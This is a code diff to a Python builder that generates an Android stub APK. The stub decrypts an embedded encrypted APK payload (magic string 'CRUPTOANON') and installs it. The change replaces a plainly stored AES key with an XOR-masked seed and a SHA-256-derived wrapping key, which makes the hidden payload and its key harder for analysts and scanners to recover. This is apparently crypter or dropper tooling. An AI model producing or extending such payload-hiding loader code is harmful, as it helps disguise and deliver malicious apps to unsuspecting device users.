@@ -444,7 +444,12 @@ class StubBuilder:
             with open(mipmap_dir / "ic_launcher_round.xml", "w", encoding="utf-8") as f:
                 f.write(xml_icon)
 
-    def build_stub_apk(self, aes_key_hex: str, original_apk_path: str, encrypted_payload: bytes) -> str:
+    def build_stub_apk(
+        self,
+        protection_config: dict[str, str],
+        original_apk_path: str,
+        encrypted_payload: bytes,
+    ) -> str:
         logger.info("Starting stub build, payload size: %s bytes", len(encrypted_payload))
         self._ensure_toolchain()
         apk_info = self.extract_apk_info(original_apk_path)
@@ -468,7 +473,7 @@ class StubBuilder:
             f.write(encrypted_payload)
         logger.info("Payload saved: %s", payload_file)
 
-        loader_code = self.generate_loader_activity(aes_key_hex, apk_info)
+        loader_code = self.generate_loader_activity(protection_config, apk_info)
         with open(
             project_dir / "src" / "com" / "loader" / "LoaderActivity.java",
             "w",
@@ -620,13 +625,16 @@ class StubBuilder:
 
         return signed_apk
 
-    def generate_loader_activity(self, aes_key_hex: str, apk_info: dict) -> str:
+    def generate_loader_activity(self, protection_config: dict[str, str], apk_info: dict) -> str:
         output_apk_name = self._java_escape(apk_info["original_filename"])
         app_label = self._java_escape(apk_info["label"])
         original_package = self._java_escape(apk_info["package"])
         payload_magic = "CRUPTOANON"
-        payload_aad = "CRUPTOANON:v1"
-        payload_version = 1
+        payload_aad = "CRUPTOANON:payload:v2"
+        key_wrap_aad = "CRUPTOANON:keywrap:v2"
+        payload_version = 2
+        seed_mask_hex = protection_config["seed_mask_hex"]
+        seed_xor_hex = protection_config["seed_xor_hex"]
 
         return f'''package com.loader;
 
@@ -644,16 +652,23 @@ import android.provider.Settings;
 import android.content.pm.PackageInstaller;
 import java.io.*;
 import java.nio.charset.StandardCharsets;
+import java.security.MessageDigest;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
 public class LoaderActivity extends Activity {{
 
-    private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
+    private static final byte[] LOADER_SEED_MASK = hexToBytes("{seed_mask_hex}");
+    private static final byte[] LOADER_SEED_XOR = hexToBytes("{seed_xor_hex}");
     private static final byte[] PAYLOAD_MAGIC = "{payload_magic}".getBytes(StandardCharsets.US_ASCII);
     private static final byte PAYLOAD_VERSION = (byte) {payload_version};
     private static final byte[] PAYLOAD_AAD = "{payload_aad}".getBytes(StandardCharsets.US_ASCII);
+    private static final byte[] KEY_WRAP_AAD = "{key_wrap_aad}".getBytes(StandardCharsets.US_ASCII);
+    private static final int WRAP_SALT_LENGTH = 16;
+    private static final int NONCE_LENGTH = 12;
+    private static final int GCM_TAG_LENGTH = 16;
+    private static final int WRAPPED_KEY_LENGTH = 32;
     private static final String OUTPUT_APK_NAME = "{output_apk_name}";
     private static final String APP_LABEL = "{app_label}";
     private static final String ORIGINAL_PACKAGE_NAME = "{original_package}";
@@ -833,7 +848,9 @@ public class LoaderActivity extends Activity {{
     }}
 
     private byte[] decryptAES(byte[] encrypted) throws Exception {{
-        if (encrypted.length < PAYLOAD_MAGIC.length + 1 + 12 + 16) {{
+        int minLength = PAYLOAD_MAGIC.length + 1 + WRAP_SALT_LENGTH + NONCE_LENGTH
+            + GCM_TAG_LENGTH + NONCE_LENGTH + GCM_TAG_LENGTH + WRAPPED_KEY_LENGTH;
+        if (encrypted.length < minLength) {{
             throw new IOException("Payload too short");
         }}
 
@@ -849,27 +866,84 @@ public class LoaderActivity extends Activity {{
         }}
         offset += 1;
 
-        byte[] nonce = new byte[12];
-        System.arraycopy(encrypted, offset, nonce, 0, 12);
-        offset += 12;
+        byte[] wrapSalt = new byte[WRAP_SALT_LENGTH];
+        System.arraycopy(encrypted, offset, wrapSalt, 0, WRAP_SALT_LENGTH);
+        offset += WRAP_SALT_LENGTH;
 
-        byte[] tag = new byte[16];
-        System.arraycopy(encrypted, offset, tag, 0, 16);
-        offset += 16;
+        byte[] wrapNonce = new byte[NONCE_LENGTH];
+        System.arraycopy(encrypted, offset, wrapNonce, 0, NONCE_LENGTH);
+        offset += NONCE_LENGTH;
+
+        byte[] wrapTag = new byte[GCM_TAG_LENGTH];
+        System.arraycopy(encrypted, offset, wrapTag, 0, GCM_TAG_LENGTH);
+        offset += GCM_TAG_LENGTH;
+
+        byte[] payloadNonce = new byte[NONCE_LENGTH];
+        System.arraycopy(encrypted, offset, payloadNonce, 0, NONCE_LENGTH);
+        offset += NONCE_LENGTH;
+
+        byte[] payloadTag = new byte[GCM_TAG_LENGTH];
+        System.arraycopy(encrypted, offset, payloadTag, 0, GCM_TAG_LENGTH);
+        offset += GCM_TAG_LENGTH;
+
+        byte[] wrappedKey = new byte[WRAPPED_KEY_LENGTH];
+        System.arraycopy(encrypted, offset, wrappedKey, 0, WRAPPED_KEY_LENGTH);
+        offset += WRAPPED_KEY_LENGTH;
 
         byte[] ciphertext = new byte[encrypted.length - offset];
         System.arraycopy(encrypted, offset, ciphertext, 0, ciphertext.length);
 
+        byte[] wrapKey = deriveWrapKey(wrapSalt);
+        byte[] payloadKey = decryptGcm(wrapKey, wrapNonce, KEY_WRAP_AAD, wrappedKey, wrapTag);
+        try {{
+            return decryptGcm(payloadKey, payloadNonce, PAYLOAD_AAD, ciphertext, payloadTag);
+        }} finally {{
+            zeroBytes(payloadKey);
+            zeroBytes(wrapKey);
+        }}
+    }}
+
+    private static byte[] decryptGcm(
+        byte[] key,
+        byte[] nonce,
+        byte[] aad,
+        byte[] ciphertext,
+        byte[] tag
+    ) throws Exception {{
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
-        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES_KEY, "AES"), spec);
-        cipher.updateAAD(PAYLOAD_AAD);
+        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), spec);
+        cipher.updateAAD(aad);
 
         byte[] input = new byte[ciphertext.length + tag.length];
         System.arraycopy(ciphertext, 0, input, 0, ciphertext.length);
         System.arraycopy(tag, 0, input, ciphertext.length, tag.length);
-
         return cipher.doFinal(input);
+    }}
+
+    private static byte[] deriveWrapKey(byte[] wrapSalt) throws Exception {{
+        MessageDigest digest = MessageDigest.getInstance("SHA-256");
+        digest.update(revealLoaderSeed());
+        digest.update(wrapSalt);
+        digest.update(KEY_WRAP_AAD);
+        return digest.digest();
+    }}
+
+    private static byte[] revealLoaderSeed() {{
+        byte[] seed = new byte[LOADER_SEED_MASK.length];
+        for (int i = 0; i < seed.length; i++) {{
+            seed[i] = (byte) (LOADER_SEED_MASK[i] ^ LOADER_SEED_XOR[i]);
+        }}
+        return seed;
+    }}
+
+    private static void zeroBytes(byte[] value) {{
+        if (value == null) {{
+            return;
+        }}
+        for (int i = 0; i < value.length; i++) {{
+            value[i] = 0;
+        }}
     }}
 
     private void installApk() {{
